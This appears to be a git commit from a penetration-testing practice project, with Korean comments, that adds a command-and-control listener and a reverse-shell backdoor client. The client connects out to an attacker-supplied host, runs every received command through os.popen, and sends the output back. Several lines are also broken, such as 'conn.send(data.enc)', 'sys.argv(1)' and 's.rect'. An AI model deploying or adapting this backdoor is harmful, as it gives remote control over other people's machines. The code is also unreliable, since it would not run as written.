6102ce278e96d66a18b479e2e7958d97efd71ab5
hyunbin1601 <vina1601@naver.com>
2023-03-23 19:07:02 +0900

    모의해킹

---
+++ backdoortry1.py
@@ -0,0 +1,24 @@
+#서버, cnc server
+import socket #socket을 불러옴
+addr = ('0.0.0.0', 12345) #local ip는 0.0.0.0으로 고정?
+with socket.socket() as s:  
+    s.bind(addr) #주소를 바인드함
+    s.listen() #주소 바인드 될 때까지 리슨함, 기다린다는 의미
+    print('cnc server is start!!')
+    conn, addr = s.accept() #서버가 응답할 경우, conn과 addr로 들어옴, 클라이언트와 연결이 맺어지면 연결 정보들이 들어온다는 의미
+    print('Connect by', addr) #누구랑 접속이 되었는지 확인해주는 코드
+    
+    while True:
+        try:          #수많은 에러들이 있으므로 try exception문 사용
+            #받아온 데이터를 출력함
+            data = conn.recv(1024) #encoding관련 코드
+            if data: #data를 받을 경우
+                print(data.decode(), end='') #받아온 데이터, 즉 반환값을 출력한다
+                #보낼 데이터를 전송함
+                data = input()  #내가 치고 싶은 데이터를 받아줌
+                conn.send(data.enc) #보낼때는 tcp이기 때문에 반드시 enc를 해 줘야 한다.
+        except Exception as e:
+            print(e) #오류 날 경우, 에러문 출력
+            
+print("end!!!")
+            
---
+++ backdoortry1_client.py
@@ -0,0 +1,34 @@
+#클라이언트(백도어)
+import os, socket, sys
+import subprocess
+
+def usage(): #help, 사용법^^
+    print(''' 
+          tcp_reverse_backdoor.py <hostIP> <port>''')
+    exit() #프로그램 동작과 상관없음ㅋ
+    
+if len(sys.argv) < 3:
+    usage()         #입력을 받을 때, 3개보다 작게 받으면 다시 입력받으라는 의미
+
+with socket.socket() as s:
+        addr = (sys.argv(1), int(sys.argv(2))) #port는 숫자로 가져와야 하기 때문에 int로 붙여줌
+        s.connect(addr) #위에서 이미 선언되어 있음
+        s.send('''
+               #################
+               conection solved
+               >>'''.encode()) #server에게 보이는 문장
+        #encode는 보낼 때 무조건 해 줘야 함. tcp형태로 보내지기 때문에
+        #데이터를 주고 받는 부분
+        while True:
+            data = s.rect(1024).decode().lower() # data의 받아진 정보가 디코딩 되어 소문자로 들어옴
+            if "q" == data:
+                exit() #program 종료
+            else:
+                if data.startswith("cd"):
+                    #cd가 하는 것은 디렉토리를 변경함 cd Desktop 이렇게 변경함
+                    os.chdir(data[3:].replace('\n', '')) #cd는 os 디렉토리?에 존재함
+                else:
+                    result = os.popen(data).read()
+                result = result + "\n>>"
+                s.send(result.encode())  #result값이 server로 전송이 된다.
+    
